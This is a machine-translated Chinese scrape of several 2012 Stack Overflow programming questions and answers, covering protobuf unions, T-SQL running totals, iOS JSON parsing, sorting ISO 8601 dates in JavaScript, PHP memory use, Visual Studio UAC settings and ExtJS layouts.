该技术也在 Google 官方文档中进行了描述，并且在各种实现中得到了很好的支持： [https ://developers.google.com/protocol-buffers/docs/techniques#union](https://developers.google.com/protocol-buffers/docs/techniques#union)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-30T08:16:07.340

基本上不是直接的；protocol buffers 很想提前知道结构，而且消息的*类型****不包括***在线路上。公共`Message`基类是提供公共管道代码的实现细节——协议缓冲区规范不包括继承。

因此，选择有限：

*   每个消息类型使用不同的字段编号
*   单独序列化消息，并将其作为`bytes`类型包含，并传达“这是什么？” 信息分开（大概是一个鉴别器/枚举）

我还应该注意，一些实现*可能会*为此提供更多支持；protobuf-net (C# / .NET) （分别）支持继承和动态消息类型（即您上面所拥有的），***但这***主要用于仅从那个库到那个库。因为这都是对规范*的补充*（就有线格式而言仍然 100% 有效），因此从其他实现中解释此类数据可能会不必要地混乱。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-04-24T10:38:31.547

[`optional`](https://developers.google.com/protocol-buffers/docs/proto#simple)作为多个字段的替代方案，该[`oneof`](https://developers.google.com/protocol-buffers/docs/proto#oneof)关键字可以从[Protocol Buffers](https://github.com/google/protobuf)的 v2.6 开始使用。

```
message UnionMessage {
  oneof data {
    string a = 1;
    bytes b = 2;
    int32 c = 3;
  }
} 
```

# android - Android - 添加到 MediaStore 会去除 Exif 数据。

> ID：12192470
> 
> 赞同：3
> 
> 时间：2012-08-30T08:04:28.420
> 
> 标签：android, android-image

我有一些图像保存在外部存储上。当我打电话时：

```
MediaStore.Images.Media.insertImage(getContentResolver(),
                fullPath, "IMG_"+System.currentTimeMillis(),null); 
```

我检查了画廊，文件在那里，但它的日期可以追溯到 1970 年。关于为什么会这样或如何解决它的任何想法？

# tsql - T/SQL - 如何选择总和最大的前 10 行（或更少）

> ID：12192471
> 
> 赞同：-4
> 
> 时间：2012-08-30T08:04:27.873
> 
> 标签：tsql

我需要选择 SUM(FileSize) < 1000000 的 10 行或更少的行。结果需要按 AttachmentId 排序。假设如果单个 FileSize 超过限制，那么只选择该行（而不是其他行）就可以了。

理想情况下，我希望它只是一个没有更多语句的选择查询。

表格是：

```
CREATE TABLE [Attachment](
    [AttachmentId] [int] NOT NULL,
    [FileSize] [int] NOT NULL
) 
```

请帮忙。

**更新**。很遗憾听到大多数读者不清楚这些要求。不需要进行任何分组。我需要得到的只是前 10 行或更少。如果它们在 FileSize 上的总数超过 1000000，它将小于 10。如果其 FileSize 等于或大于 1000000，它将只有 1 行。服务器是 SQL 2008。

**更新**。非常感谢尼古拉。我们已经到了那里，但我仍然不确定如何实现第一行超过 FileSize 1000000 的情况。

```
SELECT TOP 10 a.AttachmentId, rt.runningTotal 
FROM Attachment a
CROSS APPLY (SELECT SUM(aa.FileSize) AS runningTotal
   FROM Attachment aa
   WHERE aa.AttachmentId <= a.AttachmentId
) AS rt
GROUP BY a.AttachmentId, rt.runningTotal
HAVING rt.runningTotal < 1000000
ORDER BY a.AttachmentId 
```

**解决方案**。这是来自 Stuart 的代码（稍作修改），我接受它作为答案。非常感谢斯图尔特！：

```
WITH CTE
  AS ( SELECT TOP 10 AttachmentId, FileSize
, RunningID = ROW_NUMBER() OVER (ORDER BY AttachmentId)
   FROM Attachment
  )
SELECT AttachmentId, FileSize
FROM CTE AS a
WHERE (SELECT SUM(FileSize)
       FROM CTE
       WHERE RunningID <= a.RunningID
       ) <= 10000000
       OR a.RunningID = 1 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T01:30:55.780

也许这会让你开始：

```
BEGIN TRAN

CREATE TABLE [Attachment]
    (
      [AttachmentId] [int] NOT NULL
    , [FileSize] [int] NOT NULL
    ) 

INSERT  INTO Attachment
        SELECT  1
              , 10
        UNION
        SELECT  2
              , 20
        UNION
        SELECT  3
              , 30

--values to exceed
DECLARE @p INT = 50

--row count to restrict to
DECLARE @r INT = 10

;
WITH    CTE
          AS ( SELECT   AttachmentID
                      , FileSize
                      , RunningID = ROW_NUMBER() OVER ( ORDER BY FileSize DESC )
               FROM     Attachment
             )
    SELECT TOP ( @r )
            AttachmentID
          , FileSize
    FROM    CTE AS A
    WHERE   ( SELECT    SUM(FileSize)
              FROM      CTE
              WHERE     RunningID <= A.RunningID
            ) <= @p 
OR A.RunningID = 1

ROLLBACK 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:44:48.833

```
SELECT TOP 10 AttachmentId
FROM Attachment
GROUP BY AttachmentId
HAVING SUM(FileSize) < 1000000
ORDER BY AttachmentId 
```

# google-chrome - 如何禁用 Chrome DNS 缓存？

> ID：12192473
> 
> 赞同：8
> 
> 时间：2012-08-30T08:04:31.040
> 
> 标签：google-chrome, caching, dns

我想禁止 Chrome 执行 DNS 缓存。
有没有办法通过配置或注册表更改来做到这一点（就像 IE 和 Firefox 一样）？

# objective-c - 在xcode中每半小时后在后台调用一个函数

> ID：12192477
> 
> 赞同：0
> 
> 时间：2012-08-30T08:04:50.247
> 
> 标签：objective-c, xcode

我想在后台每半小时调用一次函数。

描述：我在 `- (void)applicationDidEnterBackground:(UIApplication *)application`方法中调用了一个函数。我需要每半小时重复一次该功能。请帮我这样做。如果您需要任何详细信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:10:33.947

在您的应用程序支持这些之前，您无法`function`在您的应用程序运行时运行任何程序 -`background`

```
Apps that play audible content to the user while in the background, such as a music player app

Apps that keep users informed of their location at all times, such as a navigation app

Apps that support Voice over Internet Protocol (VoIP)

Newsstand apps that need to download and process new content

Apps that receive regular updates from external accessories 
```

有关更多详细信息，您可以在后台执行哪些操作以及如何操作，请访问 -

[http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html](http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html)

# c# - 检测某人在 wp7 上推动屏幕的力度有多大

> ID：12192478
> 
> 赞同：2
> 
> 时间：2012-08-30T08:04:52.080
> 
> 标签：c#, windows-phone-7, touch

我试图检测有人为绘图应用程序推动 wp7 屏幕的难度。有没有办法检测触摸屏幕的表面积有多大。我认为这将是一种相当准确的方法来确定屏幕被触摸的力度 - 轻触将具有较小的触摸表面积，而用力按压将具有更大的触摸区域。

有没有人尝试过这样的事情？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T06:02:16.763

您可以通过一个非常简单的方程式来确定这一点。

> 压力 = 力 / 面积

要解决这个问题，您需要知道至少两个变量。假设您可以通过手机的传感器找到该区域。您仍然需要知道压力才能计算力，或者换句话说，用户按下屏幕的力度。

希望这对你有帮助！

# ios - 从雅虎天气解析json

> ID：12192482
> 
> 赞同：0
> 
> 时间：2012-08-30T08:05:03.070
> 
> 标签：ios, json, yahoo-weather-api

我对`JSON Parsing`iOS 中所谓的东西很陌生。谁能解释我如何从头开始解析数据。基本上我想说的是，我正在使用 Yahoo 天气 api 来获取某个位置的天气。`http://weather.yahooapis.com/forecastjson?w=2502265`是我正在使用它的链接。现在如何从中解析数据？我这样做会出错。有人可以纠正它或告诉我该怎么做吗？

```
NSString * address = @"http://weather.yahooapis.com/forecastjson?w=2502265";
NSString * request = [NSString stringWithFormat:@"%@",address];
NSURL * URL = [NSURL URLWithString:request];
NSString* JSON = [NSString stringWithContentsOfURL:URL encoding:NSUTF8StringEncoding error:&error];
NSError *e = nil;
NSMutableArray *json = [NSJSONSerialization JSONObjectWithData:JSON options:NSJSONReadingMutableContainers error:&e];
         NSLog(@"%@", json); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:22:13.273

我发现 AFNetworking 让我的生活变得轻松多了。

我通常会做一些比这更多的事情，比如传入 POST 参数，但这将适用于您的情况：

```
NSURL *url = [NSURL URLWithString:@"http://weather.yahooapis.com/forecastjson?w=2502265"];
NSURLRequest *request = [NSURLRequest requestWithURL:url];
AFJSONRequestOperation *operation = [AFJSONRequestOperation JSONRequestOperationWithRequest:request success:^(NSURLRequest *request, NSHTTPURLResponse *response, id JSON) {
    // PARSE YOUR JSON DICTIONARY HERE
    [self parseResult:JSON];
} failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error, id JSON) {
    NSLog(@"Failed to get data from web service, error: %@", [error localizedDescription]);
}];

[operation start];

// method to parse web service JSON
-(void)parseResult:(id)jsonDictionary
{
    // parse result here
    NSLog(@"Title = %@", [jsonDictionary valueForKey:@"title"];
} 
```

希望有帮助。

## 给你一些基本信息

您正在做的是从 Web 服务请求信息。

您可以将 Web 服务想象为服务器上用于侦听特定 POST 或 GET 参数的脚本。

你可能有这样的网络服务：

[http://www.mywebservice.com/rest/datatype=User?name=JohnSmith&age=20](http://www.mywebservice.com/rest/datatype=User?name=JohnSmith&age=20)

请注意，“数据类型”、“名称”和“年龄”是 Web 服务所期望的参数。当您向 Web 服务发出请求时，通常会将值（在这种情况下，“User”、“JohnSmith”和“20”是值）传递给这些参数。

如今，Web 服务通常会以 JSON 或 XML 的形式向您返回数据。

JSON 不必进行所有这些 XML 格式化，因此，JSON 将更倾向于成为返回数据的首选。

返回的 JSON 数据将类似于：

```
{
    users = {(
        ({
           name = John Smith;
           age = 20;
           address = 123 Easy Street EARTH
        }),
        ({
           name = Bob Brown;
           age = 35;
           address = 456 Some Road EARTH
        })
    )};
} 
```

上面的内容一开始可能有点吓人，但一旦你处理过一次，你就会意识到这些通常是嵌套在数组中的字典，嵌套在巨型字典中。

与上述情况一样，返回的 JSON 数据是一个包含所有用户的巨型字典。当您执行以下操作时：

```
[JSON objectForKey:@"users"] 
```

你得到“用户”数组：

```
 users = {(
        ({
           name = John Smith;
           age = 20;
           address = 123 Easy Street EARTH
        }),
        ({
           name = Bob Brown;
           age = 35;
           address = 456 Some Road EARTH
        })
    )}; 
```

然后，当您想从“用户”数组中获取特定用户时，比如 Bob Brown，您可以执行以下操作：

```
[[JSON objectForKey:@"users"] objectAtIndex:1] 
```

这将返回您：

```
{
   name = Bob Brown;
   age = 35;
   address = 456 Some Road EARTH
} 
```

最后，要获取用户的属性，例如他们的姓名，您可以：

```
[[[JSON objectForKey:@"users"] objectAtIndex:1] valueForKey:@"name"]; 
```

例如：

```
NSLog(@"User name = %@", [[[JSON objectForKey:@"users"] objectAtIndex:1] valueForKey:@"name"]); 
```

真正的 Web 服务字典通常没有那么好的格式，它们通常有点复杂，尤其是那些像 Drupal（运行！！！）这样的 CMS：D

# php - 当从浏览器调用时，apk 不能在 linux 服务器上编译，但从终端调用时可以工作

> ID：12192483
> 
> 赞同：1
> 
> 时间：2012-08-30T08:05:03.377
> 
> 标签：php, android, linux, shell, apk

我正在尝试在 linux 无头服务器上编译和打包 apk。这是我到目前为止所做的：

*   我安装了android sdk，一切正常
*   我安装了ant，一切正常

我能够从终端构建一个 android 项目，一切正常，甚至我能够从终端调用一个 bash 文件，它确实为我构建了 apk。这是bash文件：

```
#!/bin/bash
export PATH=$PATH:/var/www/zipalign
export PATH=$PATH:/usr/local/ant/bin
export PATH=$PATH:/usr/local/ant/lib
export PATH=$PATH:/usr/share/doc/openjdk-7-jdk
export PATH=$PATH:/root/android-sdk-linux
export PATH=$PATH:/root/android-sdk-linux/tools
export PATH=$PATH:/root/android-sdk-linux/platforms
export PATH=$PATH:/root/android-sdk-linux/platform-tools
export PATH=$PATH:/root/apache-ant-1.8.4/bin/ant
export PATH=$PATH:/var/www/ant/bin
ant release
echo "DONE" 
```

然后我可以从运行 bash 文件的终端调用 php 文件，它再次正常工作并且构建了 apk。这是php代码：

```
<?php 
   $output = shell_exec("./javaApk.sh");
   echo $output;
?> 
```

奇怪的是，当我从浏览器调用这个 php 时，它并没有构建 apk！它只是在浏览器中返回以下内容，但没有 apk！

```
Buildfile: /var/www/1/air.com.domain.FreshApp/java_apk/build.xml DONE 
```

当我在我的 bash 文件中回显 $PATH （从浏览器运行 php）时，我可以看到以下结果，看起来一切都很好

```
/usr/local/bin:/usr/bin:/bin:/var/www/uploads/zipalign:/usr/local/ant/bin:/usr/local/ant/lib:/usr/share/doc/openjdk-7-jdk:/root/android-sdk-linux:/root/android-sdk-linux/tools:/root/android-sdk-linux/platforms:/root/android-sdk-linux/platform-tools:/root/apache-ant-1.8.4/bin/ant:/var/www/uploads/ant/bin 
```

任何想法？

# xpath - 用于 Selenium WebDriver 或 Selenium RC 的 xpath 和 cssSelector

> ID：12192488
> 
> 赞同：2
> 
> 时间：2012-08-30T08:05:19.620
> 
> 标签：xpath, css-selectors, selenium-webdriver, selenium-rc

我有以下 HTML 代码：

```
<input type="submit" value="Publish" class="button submit"> 
```

我写的xpath如下：

```
//input[@value='Publish']
//input[@class='button submit']
//input[@type='submit'] 
```

上述用于 Selenium RC 或 WebDriver 测试的 xpath 对应的 cssSelector 是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:20:50.077

> ```
>  xpath                           cssSelector
> //input[@value='Publish']            input[value=Publish]
> //input[@class='button submit']      input.button.submit
> //input[@type='submit']              input[type=submit] 
> ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:12:22.203

为了选择你的输入元素，你必须写这样的东西

```
input[type=submit] {
    color: red;
} 
```

语法与 xpath 非常相似

`input[att=val]`- 当元素的“att”属性值正好是“val”时匹配

# javascript - 按 ISO 8601 日期对数组进行排序

> ID：12192491
> 
> 赞同：51
> 
> 时间：2012-08-30T08:05:27.873
> 
> 标签：javascript, arrays, sorting, iso8601

我如何按日期（ISO 8601）对该数组进行排序？

```
var myArray = new Array();

myArray[0] = { name:'oldest', date:'2007-01-17T08:00:00Z' }
myArray[1] = { name:'newest', date:'2011-01-28T08:00:00Z' }
myArray[2] = { name:'old',    date:'2009-11-25T08:00:00Z' } 
```

**游乐场：http:**
[//jsfiddle.net/4tUZt/](http://jsfiddle.net/4tUZt/)

提前致谢！

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2012-08-30T08:09:49.977

# 按字典顺序排序：

正如@kdbanman 指出的那样，[ISO8601](https://en.wikipedia.org/wiki/ISO_8601)^(参见*一般原则*)是为字典排序而设计的。因此，ISO8601 字符串表示可以像任何其他字符串一样排序，这将给出预期的顺序。

```
'2007-01-17T08:00:00Z' < '2008-01-17T08:00:00Z' === true 
```

所以你会实现：

```
var myArray = [
    { name:'oldest', date:'2007-01-17T08:00:00Z' },
    { name:'newest', date:'2011-01-28T08:00:00Z' },
    { name:'old',    date:'2009-11-25T08:00:00Z' }
];

myArray.sort(function(a, b) {
    return (a.date < b.date) ? -1 : ((a.date > b.date) ? 1 : 0);
}); 
```

* * *

# 使用 JavaScript 日期排序：

*旧版本的 WebKit 和 Internet Explorer 不支持 ISO 8601 日期，因此您必须创建一个兼容的日期。它受 FireFox 和现代 WebKit 支持，但*有关 Date.parse 支持[JavaScript 的更多信息，请参阅此处：哪些浏览器支持使用 Date.parse 解析 ISO-8601 日期字符串](https://stackoverflow.com/questions/5802461/javascript-which-browsers-support-parsing-of-iso-8601-date-string-with-date-par)

这是一篇非常好的文章，用于创建与 Javascript ISO 8601 兼容的日期，然后您可以像常规 javascript 日期一样对其进行排序。

[http://webcloud.se/log/JavaScript-and-ISO-8601/](https://web.archive.org/web/20121114064823/http://webcloud.se/log/JavaScript-and-ISO-8601/)

```
Date.prototype.setISO8601 = function (string) {
    var regexp = "([0-9]{4})(-([0-9]{2})(-([0-9]{2})" +
    "(T([0-9]{2}):([0-9]{2})(:([0-9]{2})(\.([0-9]+))?)?" +
    "(Z|(([-+])([0-9]{2}):([0-9]{2})))?)?)?)?";
    var d = string.match(new RegExp(regexp));

    var offset = 0;
    var date = new Date(d[1], 0, 1);

    if (d[3]) { date.setMonth(d[3] - 1); }
    if (d[5]) { date.setDate(d[5]); }
    if (d[7]) { date.setHours(d[7]); }
    if (d[8]) { date.setMinutes(d[8]); }
    if (d[10]) { date.setSeconds(d[10]); }
    if (d[12]) { date.setMilliseconds(Number("0." + d[12]) * 1000); }
    if (d[14]) {
        offset = (Number(d[16]) * 60) + Number(d[17]);
        offset *= ((d[15] == '-') ? 1 : -1);
    }

    offset -= date.getTimezoneOffset();
    time = (Number(date) + (offset * 60 * 1000));
    this.setTime(Number(time));
} 
```

用法：

```
console.log(myArray.sort(sortByDate));  

function sortByDate( obj1, obj2 ) {
    var date1 = (new Date()).setISO8601(obj1.date);
    var date2 = (new Date()).setISO8601(obj2.date);
    return date2 > date1 ? 1 : -1;
} 
```

更新了使用以包括排序技术信用@nbrooks

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2018-10-01T02:26:54.677

您可以避免创建日期并使用内置的字典比较函数[*String.prototype.localeCompare*](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/localeCompare)，而不是`?:`复合运算符或其他表达式：

```
var myArray = [
  {name: 'oldest', date: '2007-01-17T08:00:00Z'},
  {name: 'newest', date: '2011-01-28T08:00:00Z'},
  {name: 'old', date: '2009-11-25T08:00:00Z'}
];

// Oldest first
console.log(
  myArray.sort((a, b) => a.date.localeCompare(b.date))
);

// Newest first
console.log(
  myArray.sort((a, b) => -a.date.localeCompare(b.date))
);
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2019-06-25T09:26:48.687

请注意，现在接受的答案建议按字典顺序对我们的日期进行排序。

但是，**这仅在您的所有字符串都使用“Z”或“+00”时区**（= UTC）时才有效。以“Z”结尾的日期字符串确实满足 ISO8601 标准，但所有 ISO8601 都不以“Z”结尾。

因此，要完全符合 ISO8601，您需要使用一些 Date 库（例如[Javascript Date](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date)或[Moment.js](https://momentjs.com/)）解析您的字符串，并比较这些对象。对于这一部分，您可以查看 Scott 的回答，该回答还涵盖了与 ISO8601 不兼容的浏览器。

我使用 Javascript Date 的简单示例（适用于任何不太旧的浏览器）：

```
var myArray = [
    { name:'oldest', date:'2007-01-17T08:00:00Z' },
    { name:'newest', date:'2011-01-28T08:00:00+0100' },
    { name:'old',    date:'2009-11-25T08:00:00-0100' }
];

myArray.sort(function(a, b) {
    return new Date(a.date) - new Date(b.date);
}); 
```

缺点：这比仅按字典顺序比较字符串要慢。

有关 ISO8601 标准的更多信息：[这里](https://en.wikipedia.org/wiki/ISO_8601#Time_offsets_from_UTC)。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-08-30T08:15:01.940

我会这样做：

```
const myArray = new Array();

myArray[0] = { name:'oldest', date:'2007-01-17T08:00:00Z' }
myArray[1] = { name:'newest', date:'2011-01-28T08:00:00Z' }
myArray[2] = { name:'old',    date:'2009-11-25T08:00:00Z' }

function byDate (a, b) {
    if (a.date < b.date) return -1; 
    if (a.date > b.date) return 1; 
    return 0;  
}

const newArray = myArray.sort(byDate);

console.clear();
console.dir(myArray);
console.dir(newArray); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-30T08:10:31.300

[http://jsfiddle.net/4tUZt/2/](http://jsfiddle.net/4tUZt/2/)

```
$(document).ready(function()
{ 
    var myArray = [ { name:'oldest', date:'2007-01-17T08:00:00Z' },
        { name:'newest', date:'2011-01-28T08:00:00Z' },
        { name:'old',    date:'2009-11-25T08:00:00Z' }];

    console.log( myArray.sort(sortByDate) );        
});

// Stable, ascending sort (use < for descending)
function sortByDate( obj1, obj2 ) {
    return new Date(obj2.date) > new Date(obj1.date) ? 1 : -1;
} 
```

​</p>

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-08-30T08:11:29.717

演示：http: [//jsfiddle.net/4tUZt/4/](http://jsfiddle.net/4tUZt/4/)

```
var myArray = new Array();

myArray[0] = { name:'oldest', date: '2007-01-17T08:00:00Z' };
myArray[1] = { name:'newest', date: '2011-01-28T08:00:00Z' };
myArray[2] = { name:'old',    date: '2009-11-25T08:00:00Z' };

var sortFunction = function (a, b) {
  return Date.parse(b.date) - Date.parse(a.date);
};

/* or

var sortFunction = function (a, b) {
  return new Date(b.date) - new Date(a.date);
};

*/

console.log(myArray.sort(sortFunction)); 
```

​</p>

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-12T18:14:56.077

ISO8601 被设计为正确排序为纯文本，所以一般来说，正常排序就可以了。

要按数组中对象的特定键排序，您需要为该`sort()`方法指定一个比较函数。在许多其他语言中，使用函数很容易编写这些`cmp`，但是 JS 没有内置`cmp`函数，所以我发现自己编写最容易。

```
var myArray = new Array();

myArray[0] = { name:'oldest', date:'2007-01-17T08:00:00Z' }
myArray[1] = { name:'newest', date:'2011-01-28T08:00:00Z' }
myArray[2] = { name:'old',    date:'2009-11-25T08:00:00Z' }

// cmp helper function - built in to many other languages
var cmp = function (a, b) {
    return (a > b) ? 1 : ( (a > b) ? -1 : 0 );
}

myArray.sort(function (a,b) { return cmp(a.date, b.date) }); 
```

Ps 我会使用类似 JSON 的语法编写我的数组，如下所示：

```
var myArray = [
    { name:'oldest', date:'2007-01-17T08:00:00Z' },
    { name:'newest', date:'2011-01-28T08:00:00Z' },
    { name:'old',    date:'2009-11-25T08:00:00Z' }
]; 
```

# jsp - JSP - 将文本文件写入用户 c 驱动器

> ID：12192493
> 
> 赞同：-6
> 
> 时间：2012-08-30T08:05:31.180
> 
> 标签：jsp, client

我需要使用 JSP 将文本文件写入用户 C 驱动器，这可能吗，我需要这样做以检查用户是否具有管理员权限。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:07:08.573

不，JSP 在服务器上运行，不能指示浏览器读取或写入客户端系统上的任意文件。这将是一个严重的安全风险。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:07:54.200

据我所知，出于安全原因，Web 应用程序无法访问客户端计算机。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:09:38.317

当一个网页可以通过浏览器在用户的机器上写入文件时，它被称为一个严重的安全问题。

# php - 在循环中创建对象时检查内存使用情况？

> ID：12192495
> 
> 赞同：2
> 
> 时间：2012-08-30T08:05:47.797
> 
> 标签：php, zend-framework

我试图检查 memory_get_peak_usage() 方法，我尝试在 for 循环中动态创建一个对象，并尝试打印我的 php 脚本使用的内存。这是代码：-

```
$objArr = array();
for( $i=1; $i<=100; $i++ ){
 echo "creating employee == " . memory_get_peak_usage()/1024 . " Kbs\n";
 $objArr[$i] = new CEmployee();
}
exit; 
```

这是让我感到困惑的结果：-

```
creating employee == 4156.84375 Kbs
creating employee == 6619.640625 Kbs
creating employee == 6619.640625 Kbs
creating employee == 6619.640625 Kbs
...
...(up to 40 lines from 2nd line same result as above and then from 41 line changed)

creating employee == 6623.5546875 Kbs
creating employee == 6631.234375 Kbs
creating employee == 6638.9140625 Kbs
creating employee == 6646.59375 Kbs
creating employee == 6654.2734375 Kbs
creating employee == 6661.953125 Kbs
creating employee == 6669.6328125 Kbs
creating employee == 6677.3125 Kbs
creating employee == 6684.9921875 Kbs
....
.... 
```

我不知道 php 如何为对象分配内存。我在 Windows 7 的命令行界面上运行脚本

更新代码：-

```
gc_collect_cycles();
for( $i=1; $i<=100; $i++ ){
echo "creating employee == " . memory_get_usage()/1024 . " Kbs\n";
$objArr[$i] = new CEmployee();
    $objArr[$i]->setEmployeeNumber($i);
}exit; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:09:50.650

正如您所看到的，它确实增加了内存使用量：

[http://codepad.org/RApsrlXh](http://codepad.org/RApsrlXh)

但是，您可能已经准备好进行垃圾收集的数据，因此当您创建新数据时，`CEmployee`它可能正在使用该空间。

尝试`gc_collect_cycles()`在循环之前运行并使用`memory_get_usage()`以获得更准确的读数。

# visual-studio - 使用 Visual Studio 2012、Windows 8 和用户帐户控制进行调试

> ID：12192504
> 
> 赞同：5
> 
> 时间：2012-08-30T08:06:26.010
> 
> 标签：visual-studio, windows-8, uac, visual-studio-debugging

首先 - 这都是关于 RTM 版本的。并且 Windows 8 对 UAC 进行了一些更改，正如我们都从[http://www.brianbondy.com/blog/id/140/](http://www.brianbondy.com/blog/id/140/)了解到的，它不能无副作用地禁用。

现在问题开始了：我们的主应用程序需要提升权限（至少是服务器部分）。调试也只能在提升模式下运行 VS 时起作用。但是，当我在 VS 的提升模式下启动 Silverlight 项目时，启动调试的 IE 以正常权限启动，并且也无法进行调试。为了让事情变得更复杂，我们并没有在加载所有（700 多个）项目的情况下运行解决方案，而是在命令行中执行大量开发工作（编译、启动、测试）。这也需要提升。

为此目的，UAC 的正确配置是什么：我希望能够调试在 Internet Explorer 中运行的 Silverlight 应用程序、由 VS“F5”启动的任何类型的应用程序、从命令行启动的服务器进程和（可能）C#/XAML Metro -应用？

在 Windows 7 中，它只是禁用了 UAC，一切都很好。现在我想与自己的工具集作斗争，对此有一种不好的感觉。

请不要告诉我 UAC 很重要且有用。我完全可以接受，但对于开发人员来说，情况略有不同。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-24T23:18:22.097

在超级用户上看到[这个答案](https://superuser.com/a/468056/146135)：

> 我知道确保它始终以管理员身份打开（包括从文件关联、跳转列表等打开时）的唯一方法是：
> 
> 1.  在资源管理器中找到`devenv.exe`文件，例如我的文件在`C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\`
>     
>     
> 2.  右键单击 devenv.exe 并选择“疑难解答兼容性”
>     
>     
> 3.  选择“故障排除程序”
>     
>     
> 4.  选择“此程序需要其他权限”
>     
>     
> 
> 在它允许您单击下一步之前，您需要让它启动 VS，然后您就完成了。
> 
> 非常烦人，你不能再通过普通的属性对话框来做到这一点。就像微软正在竭尽全力确保 Windows 8 疏远尽可能多的人......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-11T04:25:04.827

您是否尝试过安装[VSCommands](http://visualstudiogallery.msdn.microsoft.com/a83505c6-77b3-44a6-b53b-73d77cba84c8)并使用该`Always start Visual Studio with elevated permissions`选项？我不确定这与使用提升的权限重新启动有何不同，但尝试一下也无妨。

我在命令行、调试和其他方面遇到了同样的问题，例如，一旦你以提升的权限运行，你就不能再将文件拖放到 Visual Studio 中，或者在设置为始终时打开与 Visual Studio 关联的文件以提升的权限运行。这就是我一直禁用 UAC 的原因。

最后我只是在注册表中关闭了 UAC。这样做我不会错过任何东西。很高兴听到微软如何在内部使用 Win8 + VS2012 组合，在看到它感觉多么糟糕之后。

# php - 通过对象构造数组是什么意思？

> ID：12192515
> 
> 赞同：1
> 
> 时间：2012-08-30T08:07:37.347
> 
> 标签：php, constructor

我正在学习微型 MVC 框架（Slim）的源代码，并对以下代码感到困惑：（[https://github.com/codeguy/Slim/blob/master/Slim/Slim.php](https://github.com/codeguy/Slim/blob/master/Slim/Slim.php)第 158 行）

```
$this->middleware = array($this); 
```

我以前从未见过语法，想知道是什么`array($this)`意思。

在第 1094 行：

```
$this->middleware[0]->call(); 
```

但是我注意到这`Class Slim{}`并没有实现`ArrayAccess`接口，那么如何通过索引访问它呢？

我在 PHP 手册页 (http://www.php.net/manual/en/function.array.php) 中进行了搜索，但一无所获。所以我转向这里寻求帮助，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:08:47.880

它只是创建一个包含一个对象元素的数组。

# panel - Extjs4.1：再现表单布局

> ID：12192516
> 
> 赞同：0
> 
> 时间：2012-08-30T08:07:42.490
> 
> 标签：panel, extjs4.1, form-layout

任何人都可以在 extjs4.1 中重现这种类型的布局：

![](../Images/5ddb1401ba3e5315e7d9061690518cb6.png)

我尝试重现这种类型的组合布局，但现在我只做一行或一列，而不是同时做

这是我在 extjs2 中使用的代码：

```
[{
                    layout:'column',
                    border: false,
                    items:[{
                        width:220,
                        layout: 'form',
                        border: false,
                        items: [{
                            xtype:'textfield',
                            fieldLabel: 'asd',
                            name: 'clientId',
                            tabIndex: 1
                        },{
                            xtype:'textfield',
                            fieldLabel: 'lol',
                            name: 'clientId',
                            tabIndex: 11
                        }]
                    },{
                        width:220,
                        layout: 'form',
                        border: false,
                        items: [{
                            xtype:'textfield',
                            fieldLabel: 'qwerty',
                            name: 'description',
                            tabIndex: 2
                        },{
                            xtype:'textfield',
                            fieldLabel: 'kat',
                            name: 'description',
                            tabIndex:12
                        }
                        ]
                    },{
                        width:220,
                        layout: 'form',
                        border: false,
                        items: [
                        {
                            xtype:'textfield',
                            fieldLabel: 'duck',
                            name: 'description',
                            tabIndex: 3
                        }
                        ,
                        {
                            xtype:'textfield',
                            fieldLabel: 'lucky',
                            name: 'description',
                            tabIndex: 13
                        }]

                    }] 
                }] 
```

任何类型的帮助都是有用的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:10:05.257

尝试使用[`HBox`](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.layout.container.HBox)布局，看看例子：

[http://jsfiddle.net/kG95M/](http://jsfiddle.net/kG95M/)

# visual-studio-2010 - VS2010：解决方案配置更改时运行命令

> ID：12192524
> 
> 赞同：0
> 
> 时间：2012-08-30T08:08:04.690
> 
> 标签：visual-studio-2010, visual-studio, scripting, automation

我们正在使用 Visual Studio 2010 Professional 在 C++ 中编写 Python 模块。我们在不同的目录中输出 Debug 和 Release 模块，我们代码的 Python 部分的配置文件决定了加载哪个版本。

在 C++ 开发过程中，我经常在 Release 和 Debug 配置之间切换。有时我忘记更新 Python 配置文件，然后我在 Debug 中构建，但仍在加载 Release 版本。

我想要的是自动更新配置文件，这样当我将 VS2010 解决方案配置从 Release 切换到 Debug（反之亦然）时，Python 配置文件会相应地自动更新。

**更新**：该解决方案由大约两打项目组成，并且没有一个项目会*一直*构建。我可以使用 pre-buld 命令，但我必须将它添加到我试图避免的每个项目中。

